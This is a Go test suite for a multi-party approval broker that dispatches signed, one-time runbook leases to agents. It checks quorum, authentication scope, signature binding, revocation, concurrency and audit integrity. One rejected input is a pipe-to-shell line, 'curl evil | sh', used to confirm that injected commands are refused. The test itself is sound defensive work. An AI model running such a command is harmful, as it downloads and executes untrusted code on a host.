package broker

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"sync"
	"testing"
	"time"

	"safeops/internal/agent"
	"safeops/internal/core"
	"safeops/internal/store"
)

type fixture struct {
	t      *testing.T
	broker *Broker
	server *httptest.Server
	keys   map[string]ed25519.PrivateKey
	config core.AgentConfig
}

func setup(t *testing.T, configure ...func(*core.Config, *core.AgentConfig, map[string]ed25519.PrivateKey)) *fixture {
	t.Helper()
	keys := map[string]ed25519.PrivateKey{}
	principals := []core.Principal{}
	for _, id := range []string{"alice", "bob", "carol", "audit"} {
		pub, key, _ := ed25519.GenerateKey(rand.Reader)
		keys[id] = key
		roles := []string{"approver"}
		if id == "alice" {
			roles = []string{"requester", "approver"}
		}
		if id == "audit" {
			roles = []string{"auditor"}
		}
		principals = append(principals, core.Principal{ID: id, Roles: roles, TokenHash: core.Hash([]byte(id)), PublicKey: base64.StdEncoding.EncodeToString(pub)})
	}
	pub, key, _ := ed25519.GenerateKey(rand.Reader)
	keys["broker"] = key
	rb := core.Runbook{Argv: []string{"/usr/bin/uname", "-s"}, Timeout: 10, Approvers: []string{"alice", "bob", "carol"}, Quorum: 2, Requesters: []string{"alice"}}
	action := core.Action{ID: "status", CommandHash: core.CommandHash(rb.Argv, rb.Timeout), Quorum: 2, Timeout: 10, Approvers: rb.Approvers}
	c := core.Config{Principals: principals, Agents: []core.AgentIdentity{{ID: "a1", Target: "t1", TokenHash: core.Hash([]byte("agent"))}, {ID: "a2", Target: "t2", TokenHash: core.Hash([]byte("otheragent"))}}, Targets: []core.Target{{ID: "t1", Requesters: []string{"alice"}, Actions: []core.Action{action}}, {ID: "t2", Actions: []core.Action{action}}}}
	ac := core.AgentConfig{ID: "a1", Target: "t1", BrokerKey: base64.StdEncoding.EncodeToString(pub), Runbooks: map[string]core.Runbook{"status": rb}, ApproverKeys: map[string]string{}}
	for _, p := range principals {
		ac.ApproverKeys[p.ID] = p.PublicKey
	}
	for _, change := range configure {
		change(&c, &ac, keys)
	}
	s, e := store.Open(context.Background(), "", "")
	if e != nil {
		t.Fatal(e)
	}
	b, e := New(context.Background(), c, s, key, true)
	if e != nil {
		t.Fatal(e)
	}
	srv := httptest.NewServer(b)
	t.Cleanup(srv.Close)
	return &fixture{t, b, srv, keys, ac}
}
func (f *fixture) call(identity, method, path string, body any, want int, out any) {
	f.t.Helper()
	var data []byte
	if body != nil {
		data = core.JSON(body)
	}
	req, _ := http.NewRequest(method, f.server.URL+path, bytes.NewReader(data))
	req.Header.Set("Authorization", "Bearer "+identity)
	req.Header.Set("Content-Type", "application/json")
	res, e := http.DefaultClient.Do(req)
	if e != nil {
		f.t.Fatal(e)
	}
	defer res.Body.Close()
	if res.StatusCode != want {
		var v any
		_ = json.NewDecoder(res.Body).Decode(&v)
		f.t.Fatalf("%s %s: got %d want %d: %v", method, path, res.StatusCode, want, v)
	}
	if out != nil {
		if e = json.NewDecoder(res.Body).Decode(out); e != nil {
			f.t.Fatal(e)
		}
	}
}
func (f *fixture) request() core.Request {
	f.t.Helper()
	var r core.Request
	f.call("alice", "POST", "/api/requests", map[string]any{"target": "t1", "action": "status", "reason": "INC-42 inspect kernel", "ttl_seconds": 300}, 200, &r)
	return r
}
func (f *fixture) approve(r core.Request, id string, status int) {
	f.t.Helper()
	f.call(id, "POST", "/api/requests/"+r.Intent.ID+"/approve", map[string]string{"signature": core.Sign(f.keys[id], core.ApprovalDomain, r.Payload)}, status, nil)
}
func (f *fixture) poll(identity string) *core.Envelope {
	f.t.Helper()
	var p struct {
		Job *core.Envelope `json:"job"`
	}
	f.call(identity, "POST", "/api/agent/poll", map[string]any{}, 200, &p)
	return p.Job
}
func TestIndependentQuorumAndOneTimeLease(t *testing.T) {
	f := setup(t)
	r := f.request()
	if f.poll("agent") != nil {
		t.Fatal("unapproved request dispatched")
	}
	f.approve(r, "alice", 403)
	f.approve(r, "bob", 200)
	f.approve(r, "bob", 409)
	if f.poll("agent") != nil {
		t.Fatal("partial quorum dispatched")
	}
	f.approve(r, "carol", 200)
	if f.poll("otheragent") != nil {
		t.Fatal("wrong target dispatched")
	}
	env := f.poll("agent")
	if env == nil {
		t.Fatal("no job")
	}
	if _, _, e := agent.Verify(f.config, *env, time.Now()); e != nil {
		t.Fatal(e)
	}
	if f.poll("agent") != nil {
		t.Fatal("lease redelivered")
	}
	input := map[string]any{"request_id": r.Intent.ID, "lease_id": env.Lease.ID, "output": "Linux", "exit_code": 0}
	f.call("otheragent", "POST", "/api/agent/result", input, 403, nil)
	f.call("agent", "POST", "/api/agent/result", input, 200, nil)
	f.call("agent", "POST", "/api/agent/result", input, 409, nil)
	if f.poll("agent") != nil {
		t.Fatal("completed job replayed")
	}
}
func TestAuthenticationScopeAndStrictInputs(t *testing.T) {
	f := setup(t)
	for _, tc := range []struct {
		who, path, method string
		body              any
		status            int
	}{{"wrong", "/api/requests", "GET", nil, 401}, {"agent", "/api/requests", "GET", nil, 401}, {"alice", "/api/agent/poll", "POST", map[string]any{}, 401}, {"bob", "/api/requests", "POST", map[string]any{}, 403}, {"alice", "/api/audit", "GET", nil, 403}, {"alice", "/api/requests", "POST", map[string]any{"target": "t2", "action": "status", "reason": "inspect a target"}, 403}, {"alice", "/api/requests", "POST", map[string]any{"target": "t1", "action": "status", "reason": "inspect a target", "command": "curl evil | sh"}, 400}, {"alice", "/api/requests", "POST", map[string]any{"target": "t1", "action": "status", "reason": "inspect a target", "ttl_seconds": 901}, 400}, {"alice", "/api/requests", "POST", map[string]any{"target": "t1", "action": "shell", "reason": "inspect a target"}, 403}} {
		t.Run(tc.who+tc.path+tc.method+string(core.JSON(tc.body)), func(t *testing.T) { f.call(tc.who, tc.method, tc.path, tc.body, tc.status, nil) })
	}
}
func TestSignatureCannotAuthorizeDifferentIntent(t *testing.T) {
	f := setup(t)
	r := f.request()
	r2 := f.request()
	sig := core.Sign(f.keys["bob"], core.ApprovalDomain, r.Payload)
	f.call("bob", "POST", "/api/requests/"+r2.Intent.ID+"/approve", map[string]string{"signature": sig}, 403, nil)
	f.call("bob", "POST", "/api/requests/"+r.Intent.ID+"/approve", map[string]string{"signature": "forged"}, 403, nil)
}
func TestExpiryAndRevocation(t *testing.T) {
	for _, stage := range []string{"pending", "approved", "running", "expired"} {
		t.Run(stage, func(t *testing.T) {
			f := setup(t)
			r := f.request()
			if stage != "pending" {
				f.approve(r, "bob", 200)
				f.approve(r, "carol", 200)
			}
			var env *core.Envelope
			if stage == "running" {
				env = f.poll("agent")
			}
			if stage == "expired" {
				now := time.Now().Add(16 * time.Minute)
				f.broker.Now = func() time.Time { return now }
				if f.poll("agent") != nil {
					t.Fatal("expired job dispatched")
				}
				f.approve(r, "bob", 409)
				return
			}
			f.call("alice", "POST", "/api/requests/"+r.Intent.ID+"/revoke", map[string]any{}, 200, nil)
			if f.poll("agent") != nil {
				t.Fatal("revoked job dispatched")
			}
			if env != nil {
				input := map[string]any{"request_id": r.Intent.ID, "lease_id": env.Lease.ID}
				var active struct{ Active bool }
				f.call("agent", "POST", "/api/agent/check", input, 200, &active)
				if active.Active {
					t.Fatal("revoked job remains active")
				}
				input["output"] = "cancelled"
				input["exit_code"] = -1
				f.call("agent", "POST", "/api/agent/result", input, 200, nil)
				var got core.Request
				f.call("alice", "GET", "/api/requests/"+r.Intent.ID, nil, 200, &got)
				if got.Status != "revoked" {
					t.Fatal("late result erased revocation")
				}
			}
		})
	}
}
func TestConcurrentPollingHasSingleWinner(t *testing.T) {
	f := setup(t)
	r := f.request()
	f.approve(r, "bob", 200)
	f.approve(r, "carol", 200)
	var wg sync.WaitGroup
	var mu sync.Mutex
	count := 0
	for n := 0; n < 8; n++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if f.poll("agent") != nil {
				mu.Lock()
				count++
				mu.Unlock()
			}
		}()
	}
	wg.Wait()
	if count != 1 {
		t.Fatalf("issued %d leases", count)
	}
}
func TestAuditChainAndPolicyChangeFailClosed(t *testing.T) {
	f := setup(t)
	f.request()
	var a struct{ Events []core.Audit }
	f.call("audit", "GET", "/api/audit", nil, 200, &a)
	if len(a.Events) != 1 {
		t.Fatal("missing atomic audit")
	}
	if e := store.VerifyAudit(a.Events); e != nil {
		t.Fatal(e)
	}
	c := f.broker.Config
	c.Targets[0].Actions[0].Quorum = 1
	if _, e := New(context.Background(), c, f.broker.Store, f.keys["broker"], true); e == nil {
		t.Fatal("changed policy accepted old state")
	}
}

func TestStaleBrokerFailsClosedAfterPolicyApply(t *testing.T) {
	f := setup(t)
	if e := f.broker.Store.Update(context.Background(), func(s *core.State) error { s.PolicyHash = "new-administrator-policy"; return nil }); e != nil {
		t.Fatal(e)
	}
	f.call("alice", "POST", "/api/requests", map[string]any{"target": "t1", "action": "status", "reason": "Verify stale policy denial"}, 503, nil)
}
